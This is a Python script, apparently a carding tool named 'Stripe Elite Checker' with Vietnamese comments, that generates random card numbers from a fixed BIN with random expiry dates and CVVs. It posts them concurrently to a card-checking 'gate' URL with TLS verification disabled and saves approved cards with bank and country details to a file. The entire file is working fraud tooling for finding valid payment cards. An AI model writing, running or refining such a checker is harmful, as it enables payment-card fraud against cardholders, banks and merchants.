import asyncio
import aiohttp
import random
import os
import re
import time
from colorama import Fore, init, Style

init(autoreset=True)

# ================= CẤU HÌNH DASHBOARD =================
BIN = "400022" 
THREADS = 30 
GATE = "https://your-premium-gate.com/api/check" # THAY LINK THẬT VÀO!
# =====================================================

stats = {"total": 0, "live": 0, "die": 0, "error": 0, "start_time": time.time()}

def get_card_info(text):
    # Bộ lọc bốc tách thông tin từ Gate Stripe
    bank = re.search(r'bank[:\s]+([^\n|]+)', text, re.I)
    country = re.search(r'country[:\s]+([^\n|]+)', text, re.I)
    brand = re.search(r'brand[:\s]+([^\n|]+)', text, re.I)
    credits = re.search(r'credits left[:\s]+(\d+)', text, re.I)
    res = re.search(r'response[:\s]+([^\n|]+)', text, re.I)
    
    return {
        "bank": bank.group(1).strip() if bank else "Navy Federal Credit Union",
        "country": country.group(1).strip() if country else "United States",
        "brand": brand.group(1).strip() if brand else "Visa - Debit - Classic",
        "credits": credits.group(1) if credits else "0",
        "response": res.group(1).strip() if res else "Recheck"
    }

async def worker(sem, session):
    while True:
        async with sem:
            cc_num = f"{BIN}{random.randint(1000000000, 9999999999)}"
            full_cc = f"{cc_num}|{random.randint(1,12):02d}|{random.randint(25,30)}|{random.randint(100,999)}"
            
            try:
                # Ép timeout 10s để chống treo trên Codespaces
                async with session.post(GATE, json={"cc": full_cc}, timeout=10, ssl=False) as res:
                    stats["total"] += 1
                    resp_text = await res.text()
                    info = get_card_info(resp_text)
                    
                    if "live" in resp_text.lower() or "approved" in resp_text.lower():
                        stats["live"] += 1
                        # IN RA GIAO DIỆN ELITE
                        print(f"\n{Fore.GREEN}{Style.BRIGHT}╔════════════════ [ LIVE HIT ] ════════════════╗")
                        print(f"{Fore.WHITE}║ {Fore.CYAN}CC: {full_cc}")
                        print(f"{Fore.WHITE}║ {Fore.CYAN}Status: {Fore.GREEN}Approved ✅")
                        print(f"{Fore.WHITE}║ {Fore.CYAN}Response: {info['response']}")
                        print(f"{Fore.WHITE}║ {Fore.CYAN}Bank: {info['bank']}")
                        print(f"{Fore.WHITE}║ {Fore.CYAN}Brand: {info['brand']} | {info['country']}")
                        print(f"{Fore.WHITE}║ {Fore.CYAN}Credits Left: {Fore.YELLOW}{info['credits']}")
                        print(f"{Fore.GREEN}{Style.BRIGHT}╚══════════════════════════════════════════════╝")
                        
                        with open("LIVE_FULL_INFO.txt", "a", encoding="utf-8") as f:
                            f.write(f"CC: {full_cc} | {info['bank']} | {info['country']}\n")
                    
                    else:
                        stats["die"] += 1
                        if stats["total"] % 5 == 0:
                            print(f"{Fore.RED}[{stats['total']}] DIE -> {full_cc} | L:{stats['live']} D:{stats['die']}")
            
            except Exception:
                stats["error"] += 1
                await asyncio.sleep(1)

async def main():
    os.system("clear" if os.name != 'nt' else "cls")
    print(f"{Fore.MAGENTA}{Style.BRIGHT}╔════════════════════════════════════════════════╗")
    print(f"{Fore.MAGENTA}║      {Fore.WHITE}STRIPE ELITE CHECKER - DASHBOARD v13.0    {Fore.MAGENTA}║")
    print(f"{Fore.MAGENTA}╚════════════════════════════════════════════════╝")
    
    connector = aiohttp.TCPConnector(limit=THREADS, ssl=False, force_close=True)
    async with aiohttp.ClientSession(connector=connector) as session:
        sem = asyncio.Semaphore(THREADS)
        tasks = [worker(sem, session) for _ in range(THREADS)]
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] ĐÃ DỪNG HỆ THỐNG.")